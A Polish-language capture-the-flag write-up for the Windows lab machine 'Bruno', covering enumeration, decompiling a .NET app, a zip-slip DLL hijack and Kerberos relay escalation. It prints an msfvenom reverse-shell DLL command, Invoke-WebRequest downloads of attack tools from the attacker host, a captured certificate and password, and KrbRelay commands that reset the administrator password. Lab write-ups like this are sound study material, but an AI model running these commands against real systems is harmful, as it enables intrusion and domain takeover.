# Bruno
Windows,Medium, created by **xct**

```
21/tcp   open  ftp           Microsoft ftpd
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
53/tcp   open  domain        Simple DNS Plus
80/tcp   open  http          Microsoft IIS httpd 10.0
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2024-12-02 20:40:32Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: bruno.vl0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?=
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ssl/ldap     Microsoft Windows Active Directory LDAP (Domain: bruno.vl0., Site: Default-First-Site-Name)
3268/tcp open  ldap         Microsoft Windows Active Directory LDAP (Domain: bruno.vl0., Site: Default-First-Site-Name)
3269/tcp open  ssl/ldap     Microsoft Windows Active Directory LDAP (Domain: bruno.vl0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=brunodc.bruno.vl
3389/tcp open  ms-wbt-server Microsoft Terminal Services

5357/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)

```
```
enum4linux -a 10.10.70.165
enum4linux -u anon -a 10.10.70.165
enum4linux -u guest -a 10.10.70.165
```
![{C1447E85-7E8D-4A4A-88DC-B8E56C72C4E2}](https://github.com/user-attachments/assets/70c9b6da-25e6-40cf-8df8-6d62267cdd78)

![{90A2C1EE-A4B0-434A-935C-635C8D199526}](https://github.com/user-attachments/assets/b3aec2b5-3bde-4f86-b1fa-e7053a5f6a3e)

zapowiada się sporo
`malicious` and `queue` are empty.

![{FC9E9485-4E04-4289-B92F-962AE08FADD7}](https://github.com/user-attachments/assets/6c422128-fc04-46f4-9b51-62669ea456ca)

![{55057D98-C2A5-4CD8-99F9-C58C295466EA}](https://github.com/user-attachments/assets/35a38c22-367d-4147-aca3-52aca23247e0)

![{F266EC58-3A9E-43A8-B220-0ED89CAF735C}](https://github.com/user-attachments/assets/201648aa-db2f-457b-9c78-8a432fc5eb7e)

coś tam rusza powoli.

![{0B89FC1F-AA68-431A-8171-1E3D16966FF4}](https://github.com/user-attachments/assets/3b0a0a66-7e3f-40c2-af50-e250fc1ab5d6)

![{AFC9CBA7-7450-416F-91BB-FA3AAD2BAB96}](https://github.com/user-attachments/assets/7c6f00af-d806-4747-af0c-396af083d813)

trochę enumeracji

![{A4286F5D-37F8-4A7E-ABDD-91F587EB586A}](https://github.com/user-attachments/assets/86e44804-0378-4359-aa6b-4c2ae3ccbd69)

![{66D86B0A-8E70-4E40-9A91-4F8081A71945}](https://github.com/user-attachments/assets/e504e5c3-2532-4c7b-81e0-2f06ba97087b)

Niby ESC8 pokazuje.
- ale to na spokojnie. To ftp i smb nie bez powodu mieliśmy. Zróbimy tak jak autor chciał.

apka jest w .net więc możemy "reversować" bez reversowania. Niestety tylko dllke, ale to już chyba nam wystarczy

![{702DFFFA-270C-4EF3-B8FC-91FF25A52E21}](https://github.com/user-attachments/assets/f0d5f51d-a765-41f3-9503-110d5957d640)

![{B97C56F6-AADC-4E47-8FBE-60B0B752DE97}](https://github.com/user-attachments/assets/ae7e4ed4-2666-4b37-8fc4-d30530cbb2fe)

widzimy wyraźną interakcję z folderem `queue`, który przypadkiem nazywa się tak samo jak nas share :D

```
string destinationFileName = Path.Combine("C:\\samples\\queue\\", zipArchiveEntry.FullName);
							zipArchiveEntry.ExtractToFile(destinationFileName);
```

czyli w sumie starczy stworzyć zipa, wysłać i mamy rce?
to lecimy

![{D4D2C189-6C2F-4B24-96D8-A2599BAB53C5}](https://github.com/user-attachments/assets/4b68a5ba-2cf6-410f-9ba2-0583d07aa93c)

taki dałem filtry

![{25622259-92A3-4586-A4DF-0A7EC221FA64}](https://github.com/user-attachments/assets/c8065a54-fbe7-4440-9262-462ad52ededb)

jeszcze coś doinstalować na VMce

![{2BC6858D-8E6B-4AEE-8CDA-862D8C2C6B85}](https://github.com/user-attachments/assets/ab71eb3b-be5d-434e-92eb-b6de504db764)

i jeszcze

![{5C17149F-E95A-489B-A994-12418E2E66C8}](https://github.com/user-attachments/assets/c05e9a30-2c33-46c8-a4df-e5779c423de2)

o ruszyło. JUż tworzę folder
```
mkdir samples
mkdir samples\queue
```

![{DCCF6F19-482E-422B-AB04-CD0CBFA71511}](https://github.com/user-attachments/assets/57f28771-1ec4-4c30-85d3-e163ee17f3e5)

coś mało tych operacji wykonał... hmm

dobra. Trzeba zipa tam wrzucić (rano to robię to niewybudzony człowiek.
Takie coś znalazłem do robienia symlinków `https://raw.githubusercontent.com/ptoomey3/evilarc/refs/heads/master/evilarc.py`.

![{21F6705A-C753-4321-ACF1-A72ADFB7AF42}](https://github.com/user-attachments/assets/71e17b5c-df82-4dd6-94c7-fd23e779bf0c)

![{200C0340-71C3-41D6-BD65-5B133AE34E55}](https://github.com/user-attachments/assets/1b53d8d9-4fbc-4aa7-8e33-01b80f698fc6)

![{53035DB9-9502-4F31-9B0C-5E7A1C1217AC}](https://github.com/user-attachments/assets/200248a6-3874-47ac-8e6c-f71c40d0b763)

wypakowało nam folder wyżej (czy w windowsie to jest niżej?)

![{ACA93D82-C41C-42F2-9665-BB28657FE5EE}](https://github.com/user-attachments/assets/4c3bd81b-ac77-47d0-9534-4d13b59b5751)

od razu widzę trochę więcej ciekawych operacji.

![{2BB81881-FA8E-49EA-BE3A-B86EF0D0154E}](https://github.com/user-attachments/assets/e07065a6-d290-432d-9c5f-06af0fb2ceba)

jak trochę poluzowałem filtry to widzimy inne ciekawe rzeczy ala ta dllka `hostfxr.dll`.

![{22ADC3BA-D694-4897-8877-E383AA6290BE}](https://github.com/user-attachments/assets/0641dd70-3d9c-4969-a5cc-533c9273eb2f)

zajęło mi to dłuższą chwilę, ale to będzie to

![{F64F590B-DE5E-47FB-8E61-18777807A815}](https://github.com/user-attachments/assets/0697ee1a-c35a-470d-9b6f-de4f2e4e8429)

już podaję kroki co robimy!

```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.8.4.124 LPORT=443 -f dll -o Microsoft.DiaSymReader.Native.amd64.dll
python2 evilarc.py -d 1 Microsoft.DiaSymReader.Native.amd64.dll --path app
smbclient -U svc_scan //10.10.119.169/queue
put evil.zip
```

![{294377DB-1B3C-45C6-9245-BDF0983101BA}](https://github.com/user-attachments/assets/d6f80d41-964f-49ea-912a-ba9688f48567)

yeee

![{08CDAD4F-7A97-43AB-99FC-96287E7CF5C9}](https://github.com/user-attachments/assets/8a8cd976-5248-4e9b-b1fa-aa8a0707a82c)

![{4AD9382E-A61A-427F-A382-D6D8DAC3C05A}](https://github.com/user-attachments/assets/da417fbd-c693-44b7-b0de-a8170060f20d)

![{EBC0A674-35A6-4111-AE0D-1BF83A084699}](https://github.com/user-attachments/assets/386d86e3-5929-40e2-b6b9-2e965196e526)

- trochę ciekawe uprawienie, ale na ten moment oleję. Zróbmy klasyczną enumeracje.

![{64405F7B-CFEC-4BBE-98CE-5636BD917DE1}](https://github.com/user-attachments/assets/12f557b5-765f-4389-a9f9-29f9c61d3726)

dobra wszystkie znaki na ziemi i niebie wskazują na shadowcredentials.

to pol kolei `https://github.com/ohpe/juicy-potato/tree/master/CLSID` - tutaj mamy SID'ki
to sobie pobieramy i kompilujemy
```
git clone https://github.com/Dec0ne/KrbRelayUp.git
git clone https://github.com/GhostPack/Rubeus.git
```

teraz idziemy na maszynkę
```
Invoke-WebRequest -Uri "http://10.8.4.124/KrbRelayUp.exe" -OutFile "C:\Temp\KrbRelayUp.exe " -UseBasicParsing
Invoke-WebRequest -Uri "http://10.8.4.124/Rubeus.exe" -OutFile "C:\Temp\Rubeus.exe " -UseBasicParsing
```
iii lecimy.

```
KrbRelayUp.exe full -m shadowcred -cls {d99e6e73-fc88-11d0-b498-00a0c90312f3} -p 1024
```
- I was forced to wait here for about 3 minutes

![{F5B523DA-27EF-4C4A-B787-617CC2EFD8C3}](https://github.com/user-attachments/assets/402089a0-27aa-4310-b8c5-912f3e260084)


```
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
[+] Certificate Password: uI5-pQ2#sX2=
```

i krok nr 2
```
Rubeus.exe asktgt /user:brunodc$ /certificate:<cert from KrbRelayUp> /password:<password from KrbRelayUp> /enctype:AES256 /nowrap
```
(full command)
```
Rubeus.exe asktgt /user:brunodc$ /certificate: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 /password:uI5-pQ2#sX2= /enctype:AES256 /nowrap
```


he he

![{B9FDB65F-DDB0-412F-9ABF-AADACCED2138}](https://github.com/user-attachments/assets/d7fba378-1515-42b1-bdd0-bc4c68f04b6a)

zapewne chodzi o coś związanego z tym 
```
[-] KRB-ERROR (16) : KDC_ERR_PADATA_TYPE_NOSUPP

Unhandled Exception: System.NullReferenceException: Object reference not set to an instance of an object.
   at KrbRelayUp.KRB_CRED..ctor(Byte[] bytes)
   at KrbRelayUp.Program.Main(String[] args)
```

to spróbujmy drugiej metody.
[https://gist.github.com/tothi/bf6c59d6de5d0c9710f23dae5750c4b9](https://gist.github.com/tothi/bf6c59d6de5d0c9710f23dae5750c4b9)

to lecimy.
Pobieramy
```
git clone https://github.com/Kevin-Robertson/Sharpmad.git
git clone https://github.com/cube0x0/KrbRelay.git
```

i na maszynce
```
Invoke-WebRequest -Uri "http://10.8.4.124/Sharpmad.exe " -OutFile "C:\Temp\Sharpmad.exe  " -UseBasicParsing
Invoke-WebRequest -Uri "http://10.8.4.124/KrbRelay.exe " -OutFile "C:\Temp\KrbRelay.exe  " -UseBasicParsing
```

```
. .\Sharpmad.exe MAQ -Action new -MachineAccount evilcomputer -MachinePassword pass.123

$o = ([ADSI]"LDAP://CN=evilcomputer,CN=Computers,DC=bruno,DC=vl").objectSID
(New-Object System.Security.Principal.SecurityIdentifier($o.value, 0)).Value
```

![{2F071267-A812-4FBD-BFEA-B49466AEF310}](https://github.com/user-attachments/assets/6dc711c5-f9bb-47ed-a4fe-2a6806af66bb)

```
. .\KrbRelay.exe -spn ldap/brunodc.bruno.vl -clsid d99e6e74-fc88-11d0-b498-00a0c90312f3 -rbcd S-1-5-21-1536375944-4286418366-3447278137-1116 -ssl -port 2137 -reset-password administrator Password1!
```

![{FE39C2E7-B1D7-40CC-81B6-3EBB5E434916}](https://github.com/user-attachments/assets/7cc25497-bc53-4c2b-9c4d-136da57ac633)

![{D1C672D0-8DBC-4AAB-81AF-526B49D356DE}](https://github.com/user-attachments/assets/5fc4010b-5c44-443f-b5e3-17a4c4ee654d)


FINISH
